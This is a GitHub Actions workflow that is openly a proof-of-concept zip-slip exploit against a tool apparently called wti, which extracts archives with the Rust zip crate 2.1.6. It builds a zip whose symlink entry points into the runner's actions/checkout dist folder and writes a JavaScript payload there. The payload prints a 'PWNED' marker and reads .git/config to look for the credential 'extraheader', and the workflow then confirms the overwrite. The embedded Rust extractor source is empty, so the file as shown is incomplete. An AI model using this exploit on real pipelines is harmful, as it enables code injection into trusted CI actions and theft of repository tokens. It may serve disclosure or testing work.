name: wti-zipslip-poc

on:
  push:
  workflow_dispatch:

jobs:
  poc:
    runs-on: windows-2022
    steps:
      - name: Checkout repo
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Show actions layout
        shell: pwsh
        run: |
          $root = Join-Path (Split-Path $env:RUNNER_WORKSPACE -Parent) '_actions'
          Write-Host "ROOT=$root"
          Get-ChildItem -Path $root -Recurse -Filter 'index.js' -File -ErrorAction SilentlyContinue |
            Where-Object { $_.FullName -match 'checkout' } |
            Select-Object -First 5 -ExpandProperty FullName

      - name: Build malicious zip
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          Add-Type -AssemblyName System.IO.Compression
          Add-Type -AssemblyName System.IO.Compression.FileSystem
          $root = Join-Path (Split-Path $env:RUNNER_WORKSPACE -Parent) '_actions'
          $dist = Get-ChildItem -Path $root -Recurse -Filter 'index.js' -File |
                    Where-Object { $_.FullName -match 'checkout' -and $_.DirectoryName -match '\\dist$' } |
                    Select-Object -First 1 -ExpandProperty DirectoryName
          if (-not $dist) { throw 'checkout dist not found' }
          Write-Host "DIST=$dist"
          Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'dist_path.txt') -Value $dist
          $zipPath = Join-Path $env:RUNNER_TEMP 'poc.zip'
          if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
          $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
          $e = $zip.CreateEntry('d')
          $e.ExternalAttributes = [int]0xA1FF0000
          $s = $e.Open()
          $w = New-Object System.IO.StreamWriter($s)
          $w.Write($dist)
          $w.Dispose()
          $payload = "import fs from 'node:fs';console.log('PWNED-WTI-ZIPSLIP');try{const c=fs.readFileSync(process.env.GITHUB_WORKSPACE+'/.git/config','utf8');console.log('EXTRAHEADER_PRESENT='+c.includes('extraheader'));}catch(e){console.log('NO_CONFIG')}"
          $e2 = $zip.CreateEntry('d/index.js')
          $s2 = $e2.Open()
          $w2 = New-Object System.IO.StreamWriter($s2)
          $w2.Write($payload)
          $w2.Dispose()
          $zip.Dispose()
          Write-Host "ZIP=$zipPath"

      - name: Extract exactly like wti (zip 2.1.6)
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          New-Item -ItemType Directory -Force -Path extractor/src | Out-Null
          [IO.File]::WriteAllBytes("extractor/Cargo.toml", [Convert]::FromBase64String("W3BhY2thZ2VdCm5hbWUgPSAiZXh0cmFjdG9yIgp2ZXJzaW9uID0gIjAuMS4wIgplZGl0aW9uID0gIjIwMjEiCgpbZGVwZW5kZW5jaWVzXQp6aXAgPSAiPTIuMS42Igo="))
          [IO.File]::WriteAllBytes("extractor/src/main.rs", [Convert]::FromBase64String(""))
          Push-Location extractor
          cargo build
          Pop-Location
          $zipPath = Join-Path $env:RUNNER_TEMP 'poc.zip'
          .\extractor\target\debug\extractor.exe $zipPath

      - name: Confirm overwritten
        shell: pwsh
        run: |
          $dist = Get-Content (Join-Path $env:GITHUB_WORKSPACE 'dist_path.txt')
          $hit = Select-String -Path (Join-Path $dist 'index.js') -Pattern 'PWNED-WTI-ZIPSLIP' -SimpleMatch
          Write-Host ("PAYLOAD_WRITTEN=" + [bool]$hit)
